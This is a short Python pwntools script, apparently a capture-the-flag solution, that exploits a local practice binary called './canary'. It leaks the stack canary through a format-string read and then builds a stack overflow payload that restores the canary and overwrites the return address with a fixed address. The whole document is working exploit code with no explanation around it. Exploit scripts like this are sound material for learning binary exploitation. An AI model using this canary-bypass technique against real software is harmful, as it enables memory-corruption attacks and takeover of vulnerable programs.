from pwn import *

p = process('./canary')

p.clean()
p.sendline('%15$p')
# p.sendlineafter(b'?', '%15$p')
# p.recvline()
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

#payload = buffer size + canary + space till return address + return address
payload = b'A' * 72
payload += p64(canary)
payload += b'A' * 8
payload += p64(0x0040119a)

# p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))